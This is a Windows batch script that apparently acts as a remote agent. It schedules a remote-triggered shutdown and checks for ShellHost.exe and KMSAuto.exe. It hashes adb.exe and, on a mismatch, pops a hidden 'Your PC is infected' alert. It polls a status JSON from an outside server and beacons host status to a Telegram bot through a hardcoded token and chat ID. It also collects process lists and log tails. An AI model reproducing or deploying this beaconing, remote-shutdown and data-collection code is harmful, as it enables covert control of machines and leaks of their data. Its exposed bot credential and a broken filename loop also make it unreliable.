@echo off


set "f=%temp%\exita.tmp"


if not exist "%temp%\i059.tmp" echo 777 > "%temp%\i059.tmp"
if not exist "%temp%\exita.tmp" echo 777 > "%temp%\exita.tmp"


::if not exist "%temp%\VersDev1.Piy" type nul > "%temp%\VersDev1.Piy"


for /f "usebackq delims=" %%A in ("%f%") do (
    if "%%A"=="1" (
        timeout /t 5 /nobreak
        rem goto :EOF
    ) else (
        echo Continue...
    )
)


setlocal enabledelayedexpansion


set "BATCHVERSION=9.21"
set "SENDEVERY=10"
set "SENDTXTFILE=0"
set "CRBRSCHECK=1"
set "CRBRSSTATUS=NULL"


rem if you want to shutdown change variable shutdown_ver to any other number. exclude 0
rem Disable shutdown make it 0

set "SHUTDOWN_VER=5"
set "LAST_SHUT=0"
set FLAG_FILE=%appdata%\shutdown_flag.txt




if "%SHUTDOWN_VER%"=="0" (
    echo Shutdown skipped
	echo.
	goto NEXT1Z2
)

if exist "%FLAG_FILE%" (
    for /f "usebackq delims=" %%A in ("%FLAG_FILE%") do set LAST_SHUT=%%A
) else (
    set LAST_SHUT=0
)




REM Otherwise 1..5: trigger shutdown once if different from LAST_SHUT
if "%LAST_SHUT%"=="%SHUTDOWN_VER%" (
    echo Last Shutdown is the same  %LAST_SHUT%=%SHUTDOWN_VER% Skipping.
) else (
    echo Performing shutdown version %SHUTDOWN_VER%...
    <nul set /p="%SHUTDOWN_VER%">"%FLAG_FILE%"
    shutdown /s /t 80 /c "Remote shutdown scheduled (version %SHUTDOWN_VER%)"
)








:NEXT1Z2





:: Set the log file path
set "LOGFILE=%temp%\aaazed.mpeez"

:: Start logging from this point
del /f "%LOGFILE%"
call :ALLFORCALL > "%LOGFILE%" 2>&1
goto :EOF




:ALLFORCALL
echo BatchVersion = %BATCHVERSION%




set nircmd="%APPDATA%\Microsoft\nircmd.exe"
set "SHSTFILE=D:\ShellHost.exe"
set "KMSFILE=D:\KMSAuto.exe"


set "ADBFILE=C:\adb\adb.exe"
set "ADBOFFMD5=81d188a849c8768e8f3694eb1c0e6086"
set "ADBCLEAN=NOTDEFINED"
set "ADBCLEANMSG=sdqdqsd"



set "input_file=%appdata%\Microsoft\play\playit_output.log"
set "output_file=%appdata%\Microsoft\play\playit_20lines.log"



for /f "skip=1 tokens=*" %%A in ('certutil -hashfile "%ADBFILE%" MD5 2^>nul') do (
  set "md5=%%A"
  goto :got
)

echo Failed to compute MD5.
goto :aftergot

:got
REM remove spaces (certutil sometimes prints with spaces)
set "md5=!md5: =!"
if /I "!md5!"=="%ADBOFFMD5%" (
  set "ADBCLEAN=1"
  echo is clean
) else (
  set "ADBCLEAN=0"
  echo is infected
)



:aftergot


rem assume ADBCLEAN is already set to 1 or 0
set "TMPFILE=%TEMP%\habes1.tmp"




if "%ADBCLEAN%"=="1" (
  set "ADBCLEANMSG=ADBCLEAN"
  <nul set /p=CLEAN> "%temp%\adbstatus"
) else (
  if "%ADBCLEAN%"=="0" (
    set "ADBCLEANMSG=ADBINFECTED"
    set "SENDEVERY=2"

    if exist "%TMPFILE%" (
	      start "" powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;[System.Media.SystemSounds]::Exclamation.Play();$n=New-Object System.Windows.Forms.NotifyIcon;$n.Icon=[System.Drawing.SystemIcons]::Warning;$n.Visible=$true;$n.ShowBalloonTip(10000,'Security Alert','Your PC is infected',[System.Windows.Forms.ToolTipIcon]::Warning);Start-Sleep 2;$n.Dispose()"
    ) else (
          echo "%TMPFILE%" not found.
    )

    <nul set /p=INFECTED> "%temp%\adbstatus"
  ) else (
    set "ADBCLEANMSG=ADBUNKNOWN"
  )
)



:: Check if SHSTFILE is running
set "SHSTRUNNING=0"
powershell -command "if ((Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' })) { exit 0 } else { exit 1 }"
if %errorlevel%==1 (
    echo %SHSTFILE% is not running. starting now...
    rem start "" "%SHSTFILE%"
) else (
    set "SHSTRUNNING=1"
    echo %SHSTFILE% is already running.
)

echo SHST RUNNING is !SHSTRUNNING! and %SHSTRUNNING%

echo.
echo.





:: Check if KMSFILE is running
set "KMSRUNNING=0"
powershell -command "if ((Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' })) { exit 0 } else { exit 1 }"
if %errorlevel%==1 (
    echo %KMSFILE% is not running. starting now...
    rem start "" "%KMSFILE%"
) else (
    set "KMSRUNNING=1"
    echo %KMSFILE% is already running.
)

echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%

echo.
echo.


if %CRBRSCHECK%==0 (
    echo CRBRSCHECK is disabled. skipping...
    goto NEXT67
)


:CERBERUSSTATUSREQUEST

REM download JSON quietly
curl -s "https://biianhlong.io.vn/status/status.json" -o "%temp%\status.json"

REM read line with "global"
set "status="
for /f "tokens=2 delims=:," %%a in ('findstr /i "\"global\"" "%temp%\status.json"') do (
    set "status=%%~a"
)


REM clean spaces and quotes
set "status=%status:"=%"
for /f "tokens=* delims= " %%b in ("%status%") do set "status=%%b"

if /I "%status%"=="online" (
    set "CRBRSSTATUS=ONLINE"
    echo GLOBAL is ONLINE
) else (
    set "CRBRSSTATUS=OFFLINE"
    echo GLOBAL is OFFLINE
)



:NEXT67



:: Define the file to track the last run time
set "LASTRUNFILE=%TEMP%\lastrun.log"

:: Check if the file exists
if not exist "%LASTRUNFILE%" (
    echo 1 > "%LASTRUNFILE%"
) else (
    for /f "delims=" %%A in ('type "%LASTRUNFILE%"') do set /a MINUTESS=%%A + 1
    echo !MINUTESS!> "%LASTRUNFILE%"
)

:: Read the updated value
set /p MINUTESS=<"%LASTRUNFILE%"
echo Minutess=%MINUTESS%
echo.
echo.

:: Read the updated value
set "LASTSCREENFILE=%TEMP%\lastscreenrun.log"
set /p TIMESS=<"%LASTSCREENFILE%"

:: Check if 20 minutes have passed
if %MINUTESS% GEQ %SENDEVERY% goto NEXT14

curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%CRBRSSTATUS%|%time%|%BATCHVERSION%|%ADBCLEANMSG%"

goto GOGO3





:NEXT14


if "%SENDTXTFILE%"=="0" goto SENDMSG


:: Use PowerShell to get the last 20 lines of the file and save them to the output file
powershell -Command "Get-Content '%input_file%' | Select-Object -Last 40 | Out-File '%output_file%' -Encoding utf8"
::powershell -Command "Get-Content '%input_file%' | Select-Object -Last 20 | Out-File '%output_file%'"

echo Last 40 lines have been saved to %output_file%










for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename3=!filename!"
set "filename="




set "ProcessTXTFILE=%temp%\!filename3!"


echo Saving All Processes in "%ProcessTXTFILE%"
powershell -command "Get-Process | Select-Object ProcessName, Path | Format-Table -AutoSize -Wrap" > "%ProcessTXTFILE%" 2>nul
::powershell -command "Get-Process | Select-Object ProcessName, Path" > "%ProcessTXTFILE%" 2>nul
echo Saved.
echo.






echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
echo. >> "%output_file%"
